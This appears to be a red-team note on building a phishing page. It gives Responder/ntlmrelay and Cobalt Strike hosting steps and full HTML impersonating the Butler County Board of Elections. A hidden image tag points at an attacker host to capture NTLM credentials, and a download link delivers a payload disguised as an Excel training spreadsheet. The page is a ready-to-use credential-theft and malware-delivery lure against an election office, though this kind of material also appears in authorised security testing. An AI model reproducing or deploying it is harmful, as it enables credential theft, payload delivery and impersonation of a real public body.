![7f6ec31a4c115107ebbc9a714119d2f4.png](../_resources/7f6ec31a4c115107ebbc9a714119d2f4.png)
Have a machine running responder (optional ntlmrelay) at the adress in \<img src="//...

background-image can be pulled from their public infrastructure

the icon image should be appropriate for the payload type, in this case grabbed from https://www.cleanpng.com/png-microsoft-excel-computer-icons-spreadsheet-compute-1433188/preview.html

In CobaltStrike, host the files as:
/NetworkExchange
/uploads/\<payload>
/content/\<icon>
/content/\<background>

````
<!DOCTYLE html>
<html>
<head>
<title>Network Exchange</title>
</head>
<body style="background-color: #3f3f3f">
    <div class="container-fluid">
        <div class="jumbotron" style="max-height: 275px">
<style>
body {
	background-image: url('http://10.100.1.143/content/BallotBoxBackgroundNoBlur.jpg');
	background-repeat:no-repeat;
	background-size:cover;
}
</style>
<img src="//10.100.1.146/NetworkExchange" style="display: none;"/>
<div style="background-color:  ghostwhite;
			opacity:  0.7;
			text-align: center;
            font-size: 20px; 
            padding: 5px; 
            border: 1px; 
            margin: 10px;">
<h1>Butler County Board of Elections</h1>
<h2>Network Sharing Exchange</h2>
<h3>Temporary Share 00126</h3>
<p>Available files are listed below:</p>
<a href="http://10.100.1.143/uploads/2021_BCBoE_Training_Status.xls" download>
	<img src="http://10.100.1.143/content/excel.png" alt="Download" width="104" height="52">
	<p>BCBoE Training Compliance</p>
</a>
</div>
</body>
</html>
````